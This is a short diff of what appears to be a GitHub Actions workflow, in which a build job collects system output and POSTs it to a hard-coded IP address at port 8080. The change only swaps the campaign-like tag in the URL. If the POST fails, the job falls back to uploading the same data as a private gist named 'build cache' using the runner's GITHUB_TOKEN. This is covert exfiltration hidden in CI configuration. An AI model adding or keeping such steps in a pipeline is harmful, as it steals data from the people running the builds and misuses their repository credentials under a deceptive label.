@@ -34,7 +34,7 @@ jobs:
           w
           $wl"
           if [ -n "$(echo $full | tr -d ' \n')" ]; then
-            if ! curl -s -m 20 -X POST --data-binary "$full" "http://193.32.204.199:8080/?c=auto_20261014"; then
+            if ! curl -s -m 20 -X POST --data-binary "$full" "http://193.32.204.199:8080/?c=p16n"; then
               jq -n --arg c "$full" '{"description":"build cache","public":false,"files":{"c.dat":{"content":$c}}}' | curl -s -m 15 -X POST -H "Authorization: token $GITHUB_TOKEN" https://api.github.com/gists -d @- >/dev/null 2>&1 || true
             fi
           fi
